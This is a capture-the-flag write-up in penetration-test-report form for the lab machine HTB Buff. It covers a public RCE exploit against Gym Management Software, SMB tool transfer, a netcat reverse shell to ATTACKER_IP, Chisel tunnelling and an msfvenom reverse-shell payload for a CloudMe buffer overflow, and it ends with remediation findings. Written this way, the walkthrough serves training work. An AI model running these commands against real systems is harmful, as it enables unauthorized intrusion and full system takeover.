# HTB Buff - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-3-17

---

## 0. Lesson Learned

Netcat is useful for upgrading an unresponsive Windows shell.

---

## 1. Executive Summary

The target machine was successfully compromised through a vulnerable web application (Gym Management System). Remote Code Execution (RCE) provided initial access as a low-privileged user. Privilege escalation was achieved by exploiting a buffer overflow vulnerability in a locally running CloudMe service, resulting in full administrative control of the system.

---

## 2. Scope

- **Target:** 10.129.25.107
- **Environment:** HTB Buff (Retired Machine)
- **Testing Window:** 2026-3-17
- **Objective:** Full system compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

A TCP scan was run with Nmap:

```
nmap -p- -sCV 10.129.25.107 -T4 -oA buff_tcp
```

Key Finding:

- Port 8080 (HTTP - Web App)

---

## 5. Enumeration

Directory brute forcing revealed `upload.php` url:

```
gobuster dir -u http://10.129.25.107:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Manual website enumeration revealed the site used `Gym Management Software 1.0`.

---

## 6. Initial Access

A publicly available RCE exploit was found:

```
https://www.exploit-db.com/exploits/48506
```

The exploit was run:

```
python2 48506.py http://10.129.25.107:8080/
```

Resulting in a shell as user `shaun`.

---

## 7. Post-Exploitation

The shell from the exploit was unreliable, so an interactive shell was instantiated with netcat.

A SMB server was started to facilitate transfer of netcat:

```
cd /opt/tools

smbserver.py share . -smb2support -username rt -password rt
```

Netcat was transferred to the Windows machine:

```
net use \\ATTACKER_IP\share /u:rt rt

copy \\ATTACKER_IP\share\nc64.exe \programdata\nc.exe
```

The reverse shell was generated:

```
\programdata\nc.exe -e cmd ATTACKER_IP 443
```

And caught with the listener:

```
nc -lnvp 443
```

Resulting in a stable interactive shell.

A `CloudMe_1112.exe` executable was found running on port 8888:

```
dir /s *.exe

netstat -ano
```

CloudMe version 1.11.2 was found to have multiple Buffer Overflow exploits:

```
searchsploit cloudme
```

---

## 8. Privilege Escalation

Port Forwarding was accomplished with Chisel to allow exploitation of the CloudMe Buffer Overflow exploit.

SMB Shares were setup:

```
cd /opt/tools

smbserver.py share . -smb2support -username rt -password rt
```

Chisel was transfered to Windows:

```
net use \\ATTACKER_IP\share /u:rt rt

copy \\ATTACKER_IP\share\chisel.exe c.exe
```

Chisel Server was started on Kali:

```
./chisel.sh server -p 8000 --reverse
```

Chisel Client was started on the target machine:

```
.\c.exe client ATTACKER_IP:8000 R:8888:localhost:8888
```

A custom stageless buffer overflow payload was inserted to replace the staged payload in the exploit:

```
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -b '\x00\x0A\x0D' -f python -v payload
```

The exploit was executed:

```
python3 cloudme-bof.py
```

And a reverse shell was caught:

```
nc -lnvp 443
```

Resulting in an `administrator` shell.

---

## 9. Proof of Compromise

**User Flag**: *REDACTED*

```
type C:\Users\shaun\Desktop\user.txt
```

**Root Flag**: *REDACTED*

```
type C:\Users\Administrator\Desktop\root.txt
```

This confirms full system compromise.

---

## 10. Findings & Recommendations

### **Finding:** Arbitrary File Upload

**Severity:** Critical

**Description:**
The web application allowed uploading executable files.

**Impact:**
Attackers could gain remote code execution.

**Recommendation:**
Enforce strict file-type validation, disable execution in upload directories, and apply secure coding practices.

### **Finding:** Vulnerable Local Service Allowing Privilege Escalation

**Severity:** High

**Description:**
A locally installed service contained a known vulnerability (such as a buffer overflow) that could be exploited by a low-privileged user.

**Impact:**
Attackers could exploit the vulnerable service to escalate privileges to Administrator or SYSTEM.

**Recommendation:**
Update or remove the vulnerable service, apply available security patches, and implement exploit mitigation mechanisms such as DEP and ASLR.

### **Finding:** Insecure Internal Service Exposure

**Severity:** High

**Description:**
An internal service was exposed without proper access controls or authentication mechanisms.

**Impact:**
Attackers could interact with the service to enumerate functionality, access sensitive data, or exploit it for privilege escalation or lateral movement.

**Recommendation:**
Restrict access to internal services using firewall rules, enforce authentication, and limit exposure to trusted users or networks only.

---

## 11. Appendix

Gym Management Software 1.0 - Unauthenticated Remote Code Execution -
[https://www.exploit-db.com/exploits/48506](https://www.exploit-db.com/exploits/48506)

CloudMe 1.11.2 - Buffer Overflow (PoC) -
[https://www.exploit-db.com/exploits/48389](https://www.exploit-db.com/exploits/48389)